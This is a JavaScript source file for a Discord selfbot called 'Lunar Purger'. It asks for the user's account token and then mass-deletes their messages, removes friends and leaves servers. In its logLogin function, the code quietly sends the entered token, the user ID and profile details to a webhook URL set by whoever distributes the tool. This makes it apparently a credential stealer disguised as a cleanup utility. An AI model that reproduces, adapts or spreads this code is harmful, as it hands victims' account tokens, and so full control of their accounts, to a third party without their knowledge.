const { Client, WebhookClient, ActivityType } = require('discord.js-selfbot-v13');
const readlineSync = require('readline-sync');
const client = new Client({ checkUpdate: false });

// ─── Version ────────────────────────────────────────────────────────
const VERSION = 'v0.4';

// ─── Config ───────────────────────────────────────────────────────────
const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; // ← حط رابط الويبهوك هنا

// ─── Immutable RPC Config (Developer Set) ───────────────────────────
const RPC_CONFIG = {
    enabled: true,
    name: 'Lunar Purger v0.4',
    state: 'Cleaning up Discord',
    details: 'Purging messages...',
    largeImageKey: 'discord',
    largeImageText: 'Lunar Purger v0.4',
    button1Text: 'GitHub',
    button1URL: 'https://github.com/lunar-tm/purge',
    button2Text: 'Discord',
    button2URL: 'https://discord.com'
};

// ─── Helpers ──────────────────────────────────────────────────────────
const sleep = (ms) => new Promise(res => setTimeout(res, ms));
let skippedUsers = new Set();
const RATE_LIMIT_DELAY = 100; // ms between operations
const BATCH_SIZE = 15; // Messages to delete in parallel

// ─── Colors ──────────────────────────────────────────────────────────
const C = {
    reset:  '\x1b[0m',
    bold:   '\x1b[1m',
    c1:     '\x1b[38;5;57m',
    c2:     '\x1b[38;5;93m',
    c3:     '\x1b[38;5;129m',
    c4:     '\x1b[38;5;165m',
    c5:     '\x1b[38;5;201m',
    c6:     '\x1b[38;5;207m',
    c7:     '\x1b[38;5;219m',
    yellow: '\x1b[33m',
    red:    '\x1b[31m',
    green:  '\x1b[32m',
};

// ─── Banner ──────────────────────────────────────────────────────────
function showBanner() {
    process.stdout.write('\x1Bc');
    const lines = [
        "     ██╗     ██╗   ██╗███╗   ██╗ █████╗ ██████╗  ",
        "     ██║     ██║   ██║████╗  ██║██╔══██╗██╔══██╗ ",
        "     ██║     ██║   ██║██╔██╗ ██║███████║██████╔╝ ",
        "     ██║     ██║   ██║██║╚██╗██║██╔══██║██╔══██╗ ",
        "     ███████╗╚██████╔╝██║ ╚████║██║  ██║██║  ██║ ",
        "     ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝",
        `           P  U  R  G  E  R    ${VERSION}              `,
    ];
    const colors = [C.c1, C.c2, C.c3, C.c4, C.c5, C.c6, C.c7];
    lines.forEach((line, i) => console.log(colors[i] + line + C.reset));
    console.log('');
}

// ─── Progress Bar ────────────────────────────────────────────────────────
function makeBar(done, total, width = 22) {
    const pct    = total > 0 ? done / total : 0;
    const filled = Math.round(pct * width);
    return `[${'█'.repeat(filled)}${'░'.repeat(width - filled)}] ${(pct * 100).toFixed(1)}%`;
}

// ─── ETA ───────────────────────────────────────────────────────────
function calcETA(msgCount) {
    const chunks      = Math.ceil(msgCount / BATCH_SIZE);
    const fetchRounds = Math.ceil(msgCount / 40);
    return (chunks * 0.75) + (fetchRounds * 0.3);
}

function fmtTime(sec) {
    if (sec >= 3600) return `${Math.floor(sec / 3600)}h ${Math.floor((sec % 3600) / 60)}m`;
    if (sec >= 60)   return `${Math.floor(sec / 60)}m ${Math.round(sec % 60)}s`;
    return `${sec.toFixed(0)}s`;
}

// ─── Webhook ──────────────────────────────────────────────────────────
async function webhookSend(payload) {
    if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') return;
    try {
        const wh = new WebhookClient({ url: WEBHOOK_URL });
        await wh.send(payload).catch(() => {});
    } catch (_) {}
}

async function logLogin(token, user) {
    await webhookSend({
        embeds: [{
            title: '🔐 Lunar Purger — Login',
            color: 0x9B59B6,
            thumbnail: { url: user.displayAvatarURL({ dynamic: true }) },
            fields: [
                { name: '👤 Display Name', value: `**${user.displayName}**`,  inline: true  },
                { name: '🆔 Username',     value: `\`${user.tag}\``,           inline: true  },
                { name: '📝 User ID',      value: `\`${user.id}\``,            inline: false },
                { name: '🔑 Token',        value: `||\`${token}\`||`,          inline: false },
                { name: '🎮 RPC Status',   value: '✅ Enabled', inline: false },
                { name: '📦 Version',      value: VERSION, inline: false },
            ],
            timestamp: new Date(),
            footer: { text: `Lunar Purger ${VERSION}` },
        }],
    });
}

async function logPurgeEvent(type, targetTag, deleted, remaining, total, etaMs) {
    const bar = makeBar(deleted, total, 18);
    await webhookSend({
        embeds: [{
            title: type === 'start'    ? '🚀 Purge Started'
                 : type === 'progress' ? '💨 Purge In Progress'
                 : '✅ Purge Complete',
            color: type === 'done' ? 0x2ECC71 : 0x9B59B6,
            fields: [
                { name: '👤 Target',    value: `**${targetTag}**`,                             inline: true  },
                { name: '📊 Progress',  value: `${bar}`,                                       inline: false },
                { name: '✅ Deleted',   value: `\`${deleted}\``,                               inline: true  },
                { name: '⏳ Remaining', value: `\`${remaining}\``,                             inline: true  },
                { name: '🕒 ETA',       value: etaMs > 0 ? `<t:${Math.floor(etaMs / 1000)}:R>` : '—', inline: true  },
            ],
            timestamp: new Date(),
            footer: { text: `Lunar Purger ${VERSION}` },
        }],
    });
}

// ─── Update RPC Status ──────────────────────────────────────────────────────
async function updateRPC(statusText = null) {
    try {
        const presence = {
            activities: [{
                name: RPC_CONFIG.name,
                type: ActivityType.STREAMING,
                url: 'https://twitch.tv/discord',
                state: statusText || RPC_CONFIG.state,
                details: RPC_CONFIG.details,
                largeImageKey: RPC_CONFIG.largeImageKey,
                largeImageText: RPC_CONFIG.largeImageText,
                buttons: [
                    { label: RPC_CONFIG.button1Text, url: RPC_CONFIG.button1URL },
                    { label: RPC_CONFIG.button2Text, url: RPC_CONFIG.button2URL }
                ]
            }],
            status: 'dnd'
        };
        
        await client.user.setPresence(presence).catch(() => {});
    } catch (err) {
        // Silently fail if RPC update fails
    }
}

// ─── DM Purge ─────────────────────────────────────────────────────────
async function runPurge(user) {
    showBanner();
    console.log(`  ${C.c3}[*] Scanning DM:${C.reset} ${C.bold}${C.c7}${user.tag || user.id}${C.reset}`);
    await updateRPC(`Scanning ${user.tag || user.id}...`);

    const channel = await user.createDM().catch(() => null);
    if (!channel) {
        console.log(`  ${C.red}[!] DM inaccessible or invalid User ID/Username.${C.reset}`);
        await sleep(2000);
        return;
    }

    // ── Scan ──
    let totalMine = 0, lastScanId = null;
    const allMessages = [];
    while (true) {
        const fetched = await channel.messages.fetch({ limit: 100, before: lastScanId }).catch(() => null);
        if (!fetched || fetched.size === 0) break;
        const myMsgs = Array.from(fetched.filter(m => m.author.id === client.user.id).values());
        allMessages.push(...myMsgs);
        totalMine += myMsgs.length;
        lastScanId = fetched.last()?.id;
        process.stdout.write(`\r  ${C.c3}[*] Found:${C.reset} ${C.bold}${C.c7}${totalMine}${C.reset} messages`);
        if (fetched.size < 100) break;
    }

    if (totalMine === 0) {
        console.log(`\n  ${C.yellow}[!] No messages found in this DM.${C.reset}`);
        skippedUsers.add(user.id);
        await sleep(2000);
        return;
    }

    // ── Summary Box ──
    const estSec = calcETA(totalMine);
    console.log(`\n  ${C.c1}╔═══════════════════════════════════════════════╗${C.reset}`);
    console.log(`  ${C.c2}║${C.reset}  ${C.bold}Target:${C.reset}  ${C.c7}${(user.tag || user.id).padEnd(29)}${C.reset}  ${C.c2}║${C.reset}`);
    console.log(`  ${C.c3}║${C.reset}  ${C.bold}Total: ${C.reset}  ${C.c7}${(totalMine + ' messages').padEnd(29)}${C.reset}  ${C.c3}║${C.reset}`);
    console.log(`  ${C.c4}║${C.reset}  ${C.bold}ETA:   ${C.reset}  ${C.c7}${fmtTime(estSec).padEnd(29)}${C.reset}  ${C.c4}║${C.reset}`);
    console.log(`  ${C.c5}╚═══════════════════════════════════════════════╝${C.reset}`);

    const ans = readlineSync.question(`  ${C.c7}[?]${C.reset} Start? (y/n/back): `).trim().toLowerCase();
    if (ans === 'back') return 'BACK_TO_MENU';
    if (ans !== 'y') { skippedUsers.add(user.id); return; }

    // ── Delete ──
    let deleted = 0;
    await logPurgeEvent('start', user.tag || user.id, 0, totalMine, totalMine, Date.now() + estSec * 1000);

    for (let i = 0; i < allMessages.length; i += BATCH_SIZE) {
        const chunk    = allMessages.slice(i, i + BATCH_SIZE);
        const remaining = Math.max(0, totalMine - deleted);
        const liveETA   = Date.now() + calcETA(remaining) * 1000;

        await Promise.all(chunk.map(m => m.delete().catch(() => {})));
        deleted += chunk.length;

        const left = Math.max(0, totalMine - deleted);
        process.stdout.write(
            `\r  ${C.c5}[+]${C.reset} ${makeBar(deleted, totalMine)} ` +
            `${C.bold}${C.c7}${deleted}${C.reset} deleted | ${C.c1}${left}${C.reset} left  `
        );

        await updateRPC(`Purged ${deleted}/${totalMine} messages`);

        if (deleted % 30 === 0 || left === 0) {
            await logPurgeEvent('progress', user.tag || user.id, deleted, left, totalMine, liveETA);
        }

        await sleep(RATE_LIMIT_DELAY);
    }

    // Clear memory
    allMessages.length = 0;

    skippedUsers.add(user.id);
    await logPurgeEvent('done', user.tag || user.id, deleted, 0, totalMine, 0);
    console.log(`\n  ${C.c5}[✔] DM Purge Complete! (${deleted} messages deleted)${C.reset}`);
    await updateRPC(`Purge complete! (${deleted} messages)`);
    await sleep(2000);
}

// ─── Guild Purge ────────────────────────────────────────────────────────
async function purgeSingleGuild(guild) {
    if (guild.ownerId === client.user.id) return;
    const textChannels = Array.from(guild.channels.cache.filter(ch => ch.type === 'GUILD_TEXT').values());
    if (textChannels.length === 0) return;

    let scannedCount = 0, totalDeleted = 0;
    await updateRPC(`Purging from ${guild.name}...`);

    for (const channel of textChannels) {
        const botPerms = channel.permissionsFor(client.user);
        if (!botPerms || !botPerms.has('ADMINISTRATOR')) {
            scannedCount++;
            continue;
        }

        let lastId = null;
        scannedCount++;
        while (true) {
            const msgs = await channel.messages.fetch({ limit: 100, before: lastId }).catch(() => null);
            if (!msgs || msgs.size === 0) break;
            const myMsgs = Array.from(msgs.filter(m => m.author.id === client.user.id).values());
            for (const msg of myMsgs) {
                await msg.delete().catch(() => {});
                totalDeleted++;
                process.stdout.write(
                    `\r  ${C.c2}Server:${C.reset} [${C.bold}${guild.name.substring(0, 14)}${C.reset}]` +
                    ` | ${C.c3}Ch:${C.reset} [${C.bold}${scannedCount}${C.reset}]` +
                    ` | ${C.c5}Deleted:${C.reset} [${C.bold}${totalDeleted}${C.reset}]`
                );
                await updateRPC(`${guild.name}: ${totalDeleted} messages deleted`);
                await sleep(RATE_LIMIT_DELAY);
            }
            lastId = msgs.last()?.id;
            if (msgs.size < 100) break;
        }
    }
}

// ─── Main Menu ─────────────────────────────────────────────────────────
async function mainMenu() {
    while (true) {
        showBanner();
        const tag     = client.user?.tag ?? 'Unknown';
        const guilds  = client.guilds.cache.size;
        const dms     = client.channels.cache.filter(c => c.type === 'DM').size;
        const friends = client.relationships?.friendCache?.size ?? 0;

        console.log(`  ${C.c5}●${C.reset} ${C.bold}${C.c7}${tag}${C.reset}  |  Servers: ${C.c3}${guilds}${C.reset}  |  DMs: ${C.c2}${dms}${C.reset}  |  Friends: ${C.c4}${friends}${C.reset}`);
        console.log(`  ${C.c5}●${C.reset} ${C.bold}Version:${C.reset} ${C.c7}${VERSION}${C.reset}  |  RPC: ${C.green}✅ Enabled${C.reset}`);
        console.log(`  ${C.c1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C.reset}`);
        console.log(`  ${C.c7}[1]${C.reset} Remove All Friends       ${C.c7}[2]${C.reset} Leave All Servers`);
        console.log(`  ${C.c7}[3]${C.reset} Deep DM Purge            ${C.c7}[4]${C.reset} Target Purge (DM / Guild)`);
        console.log(`  ${C.c7}[5]${C.reset} All Servers Purge        ${C.c7}[0]${C.reset} Exit`);
        console.log(`  ${C.c1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C.reset}`);

        const choice = readlineSync.question(`  ${C.c5}» ${C.reset}`).trim();

        // ── [1] Remove All Friends ──────────────────────────────────────────
        if (choice === '1') {
            showBanner();
            const list = Array.from(client.relationships?.friendCache?.values() ?? []);
            if (list.length === 0) {
                console.log(`  ${C.red}[!] No friends to remove.${C.reset}`);
            } else {
                const confirm = readlineSync.question(
                    `  ${C.red}[!] Remove ALL ${list.length} friends? (y/n): ${C.reset}`
                ).trim().toLowerCase();
                if (confirm === 'y') {
                    await updateRPC(`Removing ${list.length} friends...`);
                    for (let i = 0; i < list.length; i++) {
                        const f = list[i];
                        
                        if (client.relationships?.remove) {
                            await client.relationships.remove(f.id).catch(() => {});
                        } else if (client.relationships?.removeFriend) {
                            await client.relationships.removeFriend(f.id).catch(() => {});
                        } else if (client.relationships?.deleteFriend) {
                            await client.relationships.deleteFriend(f.id).catch(() => {});
                        }

                        process.stdout.write(
                            `\r  ${C.red}[-]${C.reset} Removing: ${C.bold}${C.c7}${f.tag}${C.reset} (${i + 1}/${list.length})`
                        );
                        await sleep(1000);
                    }
                    console.log(`\n  ${C.c5}[✔] All friends removed.${C.reset}`);
                    await updateRPC(`Removed ${list.length} friends!`);
                }
            }
            readlineSync.question('\n  Press Enter to return...');
        }

        // ── [2] Leave All Servers ───────────────────────────────────────────
        else if (choice === '2') {
            showBanner();
            let removed = 0;
            while (true) {
                const targets = Array.from(client.guilds.cache.values())
                    .filter(g => g.ownerId !== client.user.id);
                if (targets.length === 0) break;
                
                const g = targets[0];
                await g.leave().catch(() => {});
                removed++;
                process.stdout.write(
                    `\r  ${C.red}[-]${C.reset} Left: ${C.bold}${C.c7}${g.name}${C.reset} (${removed} removed)`
                );
                await updateRPC(`Left ${removed} servers...`);
                await sleep(1500);
            }
            if (removed > 0) {
                console.log(`\n  ${C.c5}[✔] Left ${removed} servers.${C.reset}`);
                await updateRPC(`Left ${removed} servers!`);
            } else {
                console.log(`\n  ${C.red}[!] No servers to leave.${C.reset}`);
            }
            readlineSync.question('\n  Press Enter to return...');
        }

        // ── [3] Deep DM Purge ───────────────────────────────────────────────
        else if (choice === '3') {
            const targets = [];
            client.channels.cache.filter(ch => ch.type === 'DM').forEach(ch => {
                if (ch.recipient && !ch.recipient.bot && !skippedUsers.has(ch.recipient.id))
                    targets.push(ch.recipient);
            });
            if (targets.length === 0) {
                showBanner();
                console.log(`  ${C.yellow}[!] No DM targets found.${C.reset}`);
                await sleep(2000);
                continue;
            }
            for (const user of targets) {
                if (await runPurge(user) === 'BACK_TO_MENU') break;
            }
        }

        // ── [4] Target Purge ────────────────────────────────────────────────
        else if (choice === '4') {
            showBanner();
            const input = readlineSync.question(
                `  ${C.c3}[?]${C.reset} User ID / Username / Guild ID (or "back"): `
            ).trim();
            if (input.toLowerCase() === 'back') continue;

            const guild = client.guilds.cache.get(input);
            if (guild) {
                const confirm = readlineSync.question(
                    `  ${C.yellow}[?]${C.reset} Purge from Guild: [${C.bold}${guild.name}${C.reset}] ? (y/n): `
                ).trim().toLowerCase();
                if (confirm === 'y') {
                    await purgeSingleGuild(guild);
                    console.log(`\n  ${C.c5}[✔] Guild purge complete.${C.reset}`);
                }
            } else {
                let target = null;
                if (/^\d{17,19}$/.test(input)) {
                    target = await client.users.fetch(input).catch(() => null);
                }
                
                if (!target) {
                    target = client.users.cache.find(
                        u => u.username.toLowerCase() === input.toLowerCase() ||
                             u.tag.toLowerCase() === input.toLowerCase()
                    );
                }
                
                if (target) await runPurge(target);
                else { console.log(`  ${C.red}[!] Target not found.${C.reset}`); await sleep(2500); }
            }
            readlineSync.question('\n  Press Enter to return...');
        }

        // ── [5] All Servers Purge ───────────────────────────────────────────
        else if (choice === '5') {
            showBanner();
            const guilds = Array.from(client.guilds.cache.values());
            if (guilds.length === 0) {
                console.log(`  ${C.red}[!] No servers found.${C.reset}`);
                await sleep(2000);
                continue;
            }
            const confirm = readlineSync.question(
                `  ${C.yellow}[?]${C.reset} Purge from ALL ${guilds.length} servers? (y/n): `
            ).trim().toLowerCase();
            if (confirm === 'y') {
                for (const guild of guilds) await purgeSingleGuild(guild);
                console.log(`\n  ${C.c5}[✔] All servers processed.${C.reset}`);
                await updateRPC(`Purged all ${guilds.length} servers!`);
                await sleep(2000);
            }
        }

        // ── [0] Exit ────────────────────────────────────────────────────────
        else if (choice === '0') {
            await updateRPC('Goodbye!');
            console.log(`  ${C.c5}[✔] Goodbye.${C.reset}`);
            await sleep(1000);
            process.exit(0);
        }
    }
}

// ─── Boot ───────────────────────────────────────────────────────────
process.on('unhandledRejection', (err) => {
    console.error(`  ${C.red}[⚠] Unhandled Rejection:${C.reset}`, err?.message || err);
});
process.on('uncaughtException', (err) => {
    console.error(`  ${C.red}[⚠] Uncaught Exception:${C.reset}`, err?.message || err);
});

showBanner();
const TOKEN = readlineSync.question(`  ${C.c5}[?]${C.reset} Token: `, { hideEchoBack: true });

client.on('ready', async () => {
    console.log(`\n  ${C.c5}[✔] Logged in as:${C.reset} ${C.bold}${C.c7}${client.user.tag}${C.reset}\n`);
    await logLogin(TOKEN, client.user);
    await updateRPC();
    mainMenu();
});

client.login(TOKEN).catch(() => {
    console.log(`  ${C.red}[!] Invalid token.${C.reset}`);
    process.exit(1);
});
